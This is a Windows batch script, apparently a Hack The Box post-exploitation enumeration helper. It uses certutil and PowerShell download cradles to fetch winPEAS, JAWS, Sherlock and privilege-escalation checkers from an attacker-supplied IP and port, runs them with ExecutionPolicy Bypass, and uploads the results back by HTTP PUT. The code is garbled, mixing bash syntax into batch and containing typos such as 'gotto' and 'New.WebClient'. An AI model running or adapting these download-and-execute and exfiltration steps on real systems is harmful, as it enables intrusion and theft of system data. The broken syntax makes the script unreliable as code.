@echo off

:: HTBEnum.bat for Windows (v0.1)
::                    Author: https://github.com/varthdader/

::     (Code is barely tested expect bugs)

@echo off
setlocal

:: Check for architecture
if "%PROCESSOR_ARCHITECTURE%"=="AMD64" (
    set ARCH=64
) else (
    set ARCH=32
)

echo Architecture: %ARCH%-bit

:: Check for PowerShell installation
where powershell >nul 2>&1
if %errorlevel% neq 0 (
    set POWERSHELL_INSTALLED=0
    echo PowerShell is not installed.
) else (
    set POWERSHELL_INSTALLED=1
    echo PowerShell is installed.
)

:: Define download URL and output file
set DOWNLOAD_URL=http://example.com/file.zip
set OUTPUT_FILE=output.zip

:: Download files
if %POWERSHELL_INSTALLED%==1 (
    echo Using PowerShell to download files...
    powershell -Command "Invoke-WebRequest -Uri '%DOWNLOAD_URL%' -OutFile '%OUTPUT_FILE%'"
) else (
    echo Using certutil to download files...
    certutil -urlcache -split -f "%DOWNLOAD_URL%" "%OUTPUT_FILE%"
)

:: Check if download was successful
if exist "%OUTPUT_FILE%" (
    echo Download successful.
) else (
    echo Download failed.
    exit /b 1
)

:: Run scripts or executables based on PowerShell installation
if %POWERSHELL_INSTALLED%==1 (
    echo Running PowerShell scripts...
    powershell -ExecutionPolicy Bypass -File script1.ps1
    powershell -ExecutionPolicy Bypass -File script2.ps1
) else (
    echo Running executables...
    start /wait exe1.exe
    start /wait exe2.bat
)

:: Zip the output
echo Zipping output...
if exist "%OUTPUT_FILE%" (
    powershell -Command "Compress-Archive -Path '%OUTPUT_FILE%' -DestinationPath 'final_output.zip'"
) else (
    echo No output file to zip.
    exit /b 1
)

:: Upload the zip file using HTTP PUT
set UPLOAD_URL=http://example.com/upload
echo Uploading final_output.zip...
if %POWERSHELL_INSTALLED%==1 (
    powershell -Command "Invoke-WebRequest -Uri '%UPLOAD_URL%' -Method Put -Infile 'final_output.zip'"
) else (
    echo Uploading with curl...
    curl -X PUT --data-binary @final_output.zip "%UPLOAD_URL%"
)

echo Done.
endlocal






:: Keep the required user input minimal for now
IP=$1
PORT=$2

:: Check if CertUtil is installed
if not exist "%SystemRoot%\system32\certutil.exe" goto cert_not_installed
goto cert_installed

:cert_installed
CERT=1
goto ps_check

:cert_not_installed
CERT=2
goto ps_check

:ps_check
if not exist "%SystemRoot%\syswow64\WindowsPowerShell\v1.0\powershell.exe" goto ps_not_installed
if not exist "%SystemRoot%\sysnative\WindowsPowerShell\v1.0\powershell.exe" goto ps_not_installed
if not exist "%SystemRoot%\WindowsPowerShell\v1.0\powershell.exe" goto ps_not_installed
gotto ps_installed

:ps_installed
PS=1
goto tool_validate

:ps_not_installed
PS=2
goto tool_validate

:tool_validate
if [ CERT -eq 2 ] || [ PS -eq 2 ]; then
  echo "CertUtil or PowerShell is not installed. Unable to Run Enumeration"
  echo "Exiting..."
  exit /b 1
fi
goto :run_enumeration

:run_enumeration
if [ CERT -eq 1 ] || [ PS -eq 2 ]; then
  :: Download the Resources using Certutil and ignore Powershell
  echo "CertUtil is installed going to use it!"
  certutil -urlcache -split -f 'http://$IP:$PORT/winpeas.bat winpeas.bat'
  certutil -urlcache -split -f 'http://$IP:$PORT/winprivesc-check.exe winprivesc-check.exe'

  :: Run Enumeration Scripts Available
  .\winpeas.bat -a -q > winpeas.txt
  .\winprivesc-check.exe > winprivesc-check.txt
  
  :: TODO: Add some options to transfer scans files back to attacker host
  echo "Enumeration Scripts have run please find the output text files"
  
  exit /b 0
fi

if [ CERT -eq 1 ] || [ PS -eq 1 ]; then
  :: Leaving these as 2 variables as seperate options for possible future changes
  goto ps_download
fi

if [ CERT -eq 2 ] || [ PS -eq 1 ]; then
  :: Leaving these as 2 variables as seperate options for possible future changes
  goto ps_download
fi

:ps_download
:: Download the Resources using Powershell
powershell "(New-Object New.WebClient).DownloadFile('http://$IP:$PORT/winpeas.bat','winpeas.bat')"
powershell "(New-Object New.WebClient).DownloadFile('http://$IP:$PORT/privesc.ps1','privesc.ps1')"
powershell "(New-Object New.WebClient).DownloadFile('http://$IP:$PORT/winprivesc-check.exe','winprivesc-check.exe')"
powershell "(New-Object New.WebClient).DownloadFile('http://$IP:$PORT/jaws-enum.ps1','jaws-enum.ps1')"
powershell "(New-Object New.WebClient).DownloadFile('http://$IP:$PORT/sherlock.ps1','sherlock.ps1')"

:: Run Enumeration Scripts Available
powershell -ExecutionPolicy Bypass -File .\privesc.ps1 -OutputFilename privesc.txt
powershell -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename jaws-enum.txt
powershell -ExecutionPolicy Bypass -File .\sherlock.ps1 -OutputFilename sherlock.txt

:: Upload Enumeration Scripts back to Auditing Host
powershell "(Invoke-WebRequest -Uri http://$IP:$PORT/ -Method Put -Body (Get-Content privesc.txt -Raw) -ContentType 'text/plain')"
powershell "(Invoke-WebRequest -Uri http://$IP:$PORT/ -Method Put -Body (Get-Content jaws-enum.txt -Raw) -ContentType 'text/plain')"
powershell "(Invoke-WebRequest -Uri http://$IP:$PORT/ -Method Put -Body (Get-Content sherlock.txt -Raw) -ContentType 'text/plain')"
exit /b 0
